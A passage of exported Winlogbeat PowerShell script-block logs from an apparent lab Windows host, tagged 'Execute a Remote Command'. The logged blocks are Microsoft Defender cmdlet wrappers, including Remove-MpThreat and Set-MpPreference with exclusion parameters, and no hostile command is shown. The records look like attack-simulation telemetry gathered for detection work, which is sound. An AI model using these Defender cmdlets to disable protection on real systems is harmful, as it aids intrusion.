
    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreatDetection.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpThreatDetection' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0000-fdcc-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3352,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.375",dHkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.649","Oct 23, 2022 @ 17:00:34.214",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpThreatCatalog'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-MpThreatCatalog
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpThreatCatalog')]

    param(
    
    [Parameter(ParameterSetName='ById')]
    [Alias('ID')]
    [ValidateNotNull()]
    [long[]]
    ${ThreatID},

    [Parameter(ParameterSetName='ById')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ThreatID})
        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreatCatalog.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpThreatCatalog' -Alias '*'
        


ScriptBlock ID: 7a79e246-b229-48d1-b07b-62d515ecaca7
Path: ","7a79e246-b229-48d1-b07b-62d515ecaca7","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpThreatCatalog'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-MpThreatCatalog
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpThreatCatalog')]

    param(
    
    [Parameter(ParameterSetName='ById')]
    [Alias('ID')]
    [ValidateNotNull()]
    [long[]]
    ${ThreatID},

    [Parameter(ParameterSetName='ById')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ThreatID})
        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreatCatalog.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpThreatCatalog' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0000-facc-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3351,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.337",c3kSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.649","Oct 23, 2022 @ 17:00:34.213",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpThreat'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Remove-MpThreat
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Remove0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Remove0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Remove0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-MpThreat' -Alias '*'
        

function Get-MpThreat
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpThreat')]

    param(
    
    [Parameter(ParameterSetName='ById')]
    [Alias('ID')]
    [ValidateNotNull()]
    [long[]]
    ${ThreatID},

    [Parameter(ParameterSetName='ById')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ThreatID})
        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpThreat' -Alias '*'
        


ScriptBlock ID: cc2ffc68-d462-4ad9-baad-3ef86055f4fb
Path: ","cc2ffc68-d462-4ad9-baad-3ef86055f4fb","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpThreat'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Remove-MpThreat
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Remove0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Remove0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Remove0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-MpThreat' -Alias '*'
        

function Get-MpThreat
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpThreat')]

    param(
    
    [Parameter(ParameterSetName='ById')]
    [Alias('ID')]
    [ValidateNotNull()]
    [long[]]
    ${ThreatID},

    [Parameter(ParameterSetName='ById')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ThreatID})
        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreat.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpThreat' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-00d3-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3350,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",X3kSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.201",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 20):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root\Microsoft\Windows\Defender\MSFT_MpPreference'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Set-MpPreference
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionPath},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionExtension},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionProcess},

    [Parameter(ParameterSetName='Set0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string[]]
    ${ExclusionIpAddress},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rtsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Both','Incoming','Outcoming')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection]
    ${RealTimeScanDirection},

    [Parameter(ParameterSetName='Set0')]
    [Alias('qpiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${QuarantinePurgeItemsAfterDelay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rsd')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day]
    ${RemediationScheduleDay},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rst')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [datetime]
    ${RemediationScheduleTime},

    [Parameter(ParameterSetName='Set0')]
    [Alias('raat')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ReportingAdditionalActionTimeOut},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rcto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ReportingCriticalFailureTimeOut},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rncto')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ReportingNonCriticalTimeOut},

    [Parameter(ParameterSetName='Set0')]
    [Alias('shri')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ServiceHealthReportInterval},

    [Parameter(ParameterSetName='Set0')]
    [Alias('rdsde')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${ReportDynamicSignatureDroppedEvent},

    [Parameter(ParameterSetName='Set0')]
    [Alias('saclf')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [byte]
    ${ScanAvgCPULoadFactor},

    [Parameter(ParameterSetName='Set0')]
    [Alias('csbr')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [bool]
    ${CheckForSignaturesBeforeRunningScan},

    [Parameter(ParameterSetName='Set0')]
    [Alias('spiad')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [uint32]
    ${ScanPurgeItemsAfterDelay},

